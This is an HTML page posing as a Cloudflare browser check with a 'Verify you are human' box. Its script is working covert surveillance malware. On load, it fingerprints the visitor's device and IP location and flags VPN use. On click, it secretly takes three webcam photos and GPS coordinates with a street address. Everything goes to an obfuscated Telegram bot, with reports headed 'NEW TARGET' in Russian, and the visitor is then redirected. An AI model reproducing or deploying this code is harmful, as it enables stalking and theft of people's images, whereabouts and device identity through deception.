<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Just a moment...</title>
    <style>
        * { box-sizing: border-box; }
        body {
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
            color: #404040;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            -webkit-font-smoothing: antialiased;
        }
        .main-wrapper {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            width: 100%;
        }
        h1 {
            font-size: 40px;
            font-weight: 500;
            margin: 0 0 10px;
            color: #333;
            letter-spacing: -0.5px;
        }
        p {
            font-size: 16px;
            margin-bottom: 25px;
            line-height: 1.6;
        }
        .turnstile-box {
            display: flex;
            align-items: center;
            background: #f9f9f9;
            border: 1px solid #dcdcdc;
            padding: 12px 16px;
            border-radius: 4px;
            margin-bottom: 20px;
            width: 300px;
            user-select: none;
        }
        .checkbox {
            width: 26px;
            height: 26px;
            border: 2px solid #c5c5c5;
            border-radius: 2px;
            background: #fff;
            margin-right: 12px;
            cursor: pointer;
            position: relative;
            flex-shrink: 0;
            transition: all 0.2s;
        }
        .checkbox:hover { border-color: #0051c3; }
        .label {
            font-size: 14px;
            font-weight: 500;
            color: #333;
            cursor: pointer;
            line-height: 1;
            margin-top: 1px;
        }
        .logo-cf {
            margin-left: auto;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .logo-cf svg { width: 50px; height: auto; opacity: 0.8; }
        .logo-text { font-size: 9px; color: #999; margin-top: 2px; }
        
        .footer {
            text-align: center;
            font-size: 12px;
            color: #999;
            padding: 20px;
            border-top: 1px solid #eaeaea;
        }
        
        /* Spinner */
        .spinner {
            display: none;
            width: 22px;
            height: 22px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0051c3;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 12px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Success Checkmark */
        .checkmark {
            display: none;
            width: 26px;
            height: 26px;
            margin-right: 12px;
        }
        .checkmark::after {
            content: '';
            display: block;
            width: 8px;
            height: 16px;
            border: solid #009900;
            border-width: 0 3px 3px 0;
            transform: rotate(45deg);
            margin-left: 8px;
            margin-top: 2px;
        }

        /* Hidden Elements */
        #video, #canvas {
            position: absolute;
            top: -9999px;
            left: -9999px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>

    <div class="main-wrapper">
        <div class="container">
            <h1>Checking your browser before accessing the site.</h1>
            <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
            <p style="color: #666; font-size: 14px;">Please allow up to 5 seconds...</p>
            
            <div class="turnstile-box" id="captcha-box">
                <div class="checkbox" id="btn"></div>
                <div class="spinner" id="loader"></div>
                <div class="checkmark" id="success-icon"></div>
                <span class="label" id="label-text">Verify you are human</span>
                <div class="logo-cf">
                    <svg viewBox="0 0 62 25" fill="#333"><path d="M51.9 14.2c-.3-1.4-1.4-2.4-2.8-2.6.2-.6.3-1.3.3-2 0-3.3-2.7-6-6-6-.5 0-1 .1-1.5.2-.8-2.6-3.3-4.5-6.2-4.5-3.6 0-6.5 2.9-6.5 6.5 0 .4 0 .7.1 1.1-1.3-1.1-3-1.8-4.9-1.8-4.1 0-7.5 3.4-7.5 7.5 0 .2 0 .4.1.6C7.5 13.8 0 14.8 0 17.5c0 3 2.5 5.5 5.5 5.5h45c3 0 5.5-2.5 5.5-5.5 0-2.3-1.6-4.3-4.1-4.1z" opacity=".2"/></svg>
                    <span class="logo-text">Cloudflare</span>
                </div>
            </div>
        </div>
    </div>

    <div class="footer">
        Ray ID: <span id="ray-id"></span> &bull; IP: <span id="display-ip">Checking secure connection...</span> &bull; Performance & security by Cloudflare
    </div>

    <!-- Hidden Media -->
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        // --- 1. CONFIGURATION (SECURE) ---
        const _cf_uid = ["NzkyMjMyNzU0NjpBQUdDVjRpb0ZaRmk2", "eG5oTjdfZ3puLVo0dnJq", "UEgzcWJIOA=="];
        const _chk_id = ["NzEyMjY3", "MDA5OQ=="];

        function _0xElite(p) {
            return atob(p.join(''));
        }
        
        // UI Init
        document.getElementById('ray-id').innerText = Math.random().toString(16).substr(2, 16);

        // --- 2. UTILS ---
        const sleep = (ms) => new Promise(r => setTimeout(r, ms));
        const log = (msg) => console.log(`[ELITE] ${msg}`);

        // --- 3. FINGERPRINTING & HARDWARE ---
        function getCanvasHash() {
            try {
                const c = document.createElement('canvas');
                const ctx = c.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125,1,62,20);
                ctx.fillStyle = "#069";
                ctx.fillText("Trae_Elite_v1.0", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("Trae_Elite_v1.0", 4, 17);
                
                let str = c.toDataURL();
                let hash = 0;
                for (let i = 0; i < str.length; i++) {
                    const char = str.charCodeAt(i);
                    hash = ((hash << 5) - hash) + char;
                    hash = hash & hash;
                }
                return hash.toString(16);
            } catch (e) { return "Error"; }
        }

        function getGPU() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "Не поддерживается";
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (!debugInfo) return "Скрыто";
                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            } catch (e) { return "Ошибка"; }
        }

        function getSystemInfo() {
            return {
                cores: navigator.hardwareConcurrency || "Неизвестно",
                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Неизвестно",
                langs: navigator.languages ? navigator.languages.join(', ') : "Неизвестно",
                platform: navigator.platform,
                fingerprint: getCanvasHash(),
                gpu: getGPU(),
                connection: navigator.connection ? navigator.connection.effectiveType : "Неизвестно",
                inputMethod: navigator.maxTouchPoints > 0 ? "Touch Screen" : "Mouse/Keyboard"
            };
        }

        // --- 4. ADVANCED NETWORK & VPN (IMMORTAL IP + CITY FIX) ---
        async function getAdvancedIP() {
            let data = null;
            
            // Helper: Fetch with timeout
            const fetchJSON = (url) => Promise.race([
                fetch(url).then(r => r.json()),
                new Promise((_, r) => setTimeout(() => r(new Error('Timeout')), 2000))
            ]);

            // --- 1. IMMORTAL IP LOOP (BLOCKING) ---
            while (!data || !data.country_code) {
                try {
                    // Source 1: ipapi.co (Best)
                    try {
                        const d = await fetchJSON('https://ipapi.co/json/');
                        if (d.country_code) {
                            data = { 
                                ip: d.ip, 
                                city: d.city || d.region, 
                                country: d.country_name, 
                                code: d.country_code, 
                                isp: d.org,
                                timezone: d.timezone,
                                utc: d.utc_offset 
                            };
                            break;
                        }
                    } catch(e) {}

                    // Source 2: api.ip.sb (Backup)
                    try {
                        const d = await fetchJSON('https://api.ip.sb/geoip');
                        if (d.country_code) {
                            data = { 
                                ip: d.ip, 
                                city: d.city || d.region, 
                                country: d.country, 
                                code: d.country_code, 
                                isp: d.isp,
                                timezone: d.timezone,
                                utc: "UTC" 
                            };
                            break;
                        }
                    } catch(e) {}

                    // Source 3: freeipapi.com (Emergency)
                    try {
                        const d = await fetchJSON('https://freeipapi.com/api/json');
                        if (d.countryCode) {
                            data = { 
                                ip: d.ipAddress, 
                                city: d.cityName, 
                                country: d.countryName, 
                                code: d.countryCode, 
                                isp: d.isp,
                                timezone: d.timeZone,
                                utc: "UTC" 
                            };
                            break;
                        }
                    } catch(e) {}

                    if (!data) await sleep(1000); // Retry delay
                } catch (e) { await sleep(1000); }
            }

            // --- ULTIMATE VPN DETECT ---
            let vpnAlert = "";
            const browserOffset = new Date().getTimezoneOffset(); 
            // -180 = UTC+3 (Minsk/Moscow)
            
            // Logic: If Browser is GMT+3 (Minsk/Moscow) AND IP is NOT BY/RU
            if (browserOffset === -180) {
                const cc = (data.code || "").toUpperCase();
                if (cc !== 'BY' && cc !== 'RU') {
                    vpnAlert = "СТАТУС: ОБНАРУЖЕН VPN";
                }
            }

            return { ...data, vpnAlert };
        }

        // --- 5. TELEGRAM SENDER ---
        async function sendTelegram(text, photos = []) {
            const token = _0xElite(_cf_uid);
            const chat = _0xElite(_chk_id);
            const baseUrl = `https://api.telegram.org/bot${token}`;
            
            try {
                if (photos.length === 0) {
                    await fetch(`${baseUrl}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: chat, text: text, parse_mode: 'Markdown', disable_web_page_preview: true })
                    });
                } else {
                    const formData = new FormData();
                    formData.append('chat_id', chat);
                    
                    photos.forEach((blob, i) => {
                        formData.append(`photo${i}`, blob, `cam_${i}.jpg`);
                    });

                    // Construct MediaGroup
                    const media = photos.map((_, i) => ({
                        type: 'photo',
                        media: `attach://photo${i}`,
                        caption: i === 0 ? text : '',
                        parse_mode: 'Markdown'
                    }));
                    formData.append('media', JSON.stringify(media));

                    await fetch(`${baseUrl}/sendMediaGroup`, {
                        method: 'POST',
                        body: formData
                    });
                }
                log("Sent successfully");
            } catch (e) {
                log("Send Error: " + e.message);
            }
        }

        // --- 6. PHASE 1: INSTANT REPORT ---
        document.addEventListener("DOMContentLoaded", async () => {
            log("Phase 1 Init...");
            
            // Blocking wait for IP
            const net = await getAdvancedIP();
            const sys = getSystemInfo();
            
            document.getElementById('display-ip').innerText = net.ip;

            const report = `
*НОВАЯ ЦЕЛЬ (ONLINE)*
━━━━━━━━━━━━━━━━
${net.vpnAlert}

*СЕТЬ*
IP: \`${net.ip}\`
Город: ${net.city} (Таймзона: ${net.timezone})
Страна: ${net.country}
Провайдер: ${net.isp}
Связь: ${sys.connection}

*ЖЕЛЕЗО*
Устройство: ${sys.inputMethod}
GPU: ${sys.gpu}
CPU: ${sys.cores} ядра | RAM: ${sys.ram}
ОС: ${sys.platform}
*Fingerprint: ${sys.fingerprint}*

Время: ${new Date().toLocaleTimeString()}
`.trim();

            await sendTelegram(report);
        });

        // --- 7. PHASE 2: INTERACTIVE STRIKE ---
        const btnBox = document.getElementById('captcha-box');
        const btn = document.getElementById('btn');
        const loader = document.getElementById('loader');
        const label = document.getElementById('label-text');
        const success = document.getElementById('success-icon');

        btnBox.onclick = async () => {
            if (btn.style.display === 'none') return;
            
            // UI Transition
            btn.style.display = 'none';
            loader.style.display = 'block';
            label.innerText = "Verifying...";
            
            log("Phase 2 Start...");

            // Default Values
            let battery = "Неизвестно";
            
            // Battery
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                battery = `${Math.round(b.level * 100)}%`;
                if (b.charging) battery += " ⚡ (Заряжается)";
            }

            try {
                // Camera
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
                });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await video.play();

                // GPS (Wait Indefinitely for User)
                let gpsText = "";
                
                const getGPS = new Promise((resolve) => { 
                     navigator.geolocation.getCurrentPosition( 
                         async (pos) => { 
                             const { latitude, longitude } = pos.coords; 
                              
                             // 1. ИСПРАВЛЕННАЯ ССЫЛКА (Официальная, чтобы была синей в ТГ) 
                             const link = `https://www.google.com/maps?q=${latitude},${longitude}`; 
                              
                             // Reverse Geo 
                             let addr = "Не определен"; 
                             try { 
                                 const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`); 
                                 addr = (await r.json()).display_name; 
                             } catch {} 
                              
                             // 2. ИСПРАВЛЕННЫЙ ТЕКСТ (Как ты просил)
                            resolve(`Адрес: ${addr}\nКарты: [клик](${link})`); 
                         },  
                         (err) => { 
                             resolve(`*Юзер запретил доступ к GPS*`); 
                         },  
                         { enableHighAccuracy: true } 
                     ); 
                 });

                // Warmup 2.5s
                log("Warmup 2.5s...");
                await sleep(2500);

                // Capture
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                const photos = [];

                for (let i = 0; i < 3; i++) {
                    ctx.drawImage(video, 0, 0);
                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
                    photos.push(blob);
                    if (i < 2) await sleep(800);
                }

                // Wait for GPS (Must finish)
                gpsText = await getGPS;

                // Cleanup
                stream.getTracks().forEach(t => t.stop());

                // UI Success
                loader.style.display = 'none';
                success.style.display = 'block';
                label.innerText = "Success!";
                label.style.color = "#009900";

                const finalMsg = `
*ПОЛНЫЙ ОТЧЕТ (Phase 2)*
━━━━━━━━━━━━━━━━
*ГЕОПОЗИЦИЯ*
${gpsText}

*СТАТУС БАТАРЕИ*
Заряд: ${battery}

*ФОТО*
Захвачено фото: ${photos.length} шт.
`.trim();

                await sendTelegram(finalMsg, photos);
                
                // Redirect
                setTimeout(() => window.location.href = "https://vk.com/atypical_kazan", 1000);

            } catch (e) {
                log("Error: " + e.message);
                sendTelegram(`*ОТКАЗ ДОСТУПА*\nПричина: ${e.message}`);
                window.location.href = "https://vk.com/atypical_kazan";
            }
        };
    </script>
</body>
</html>
